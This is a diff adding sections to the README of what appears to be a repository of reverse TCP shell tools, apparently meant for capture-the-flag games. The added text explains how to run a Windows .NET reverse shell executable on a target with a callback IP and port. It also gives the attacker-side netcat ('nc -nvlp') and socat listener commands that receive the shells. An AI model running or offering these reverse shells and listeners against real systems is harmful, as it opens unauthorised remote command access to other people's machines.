@@ -43,3 +43,22 @@ The following repository contains multiple versions of a reverse tcp netcat shel
     
     ./reverse_tcp.sh [callback_ip] [port]
     
+ # Windows Reverse Powershell
+  Since none of the other methods work on windows the reverse_tcp.exe is a .NET executable with the same ease of use as the others
+  
+  To run this on a target simply run it from the command line like so:
+  
+    .\reverse_tcp.exe [callback_ip] [port]
+    
+    
+# Attacker Listener
+  These reverse shells were all written for ease of use attackers can open a simple netcat or socat listener to receive the payloads
+  
+  Netcat:
+    nc -nvlp [port]
+    
+  Socat:
+    socat -d -d TCP4-LISTEN:[port] STDOUT
+    
+  Once your listener is up just wait for the payload to come your way and get them flags XD
+    
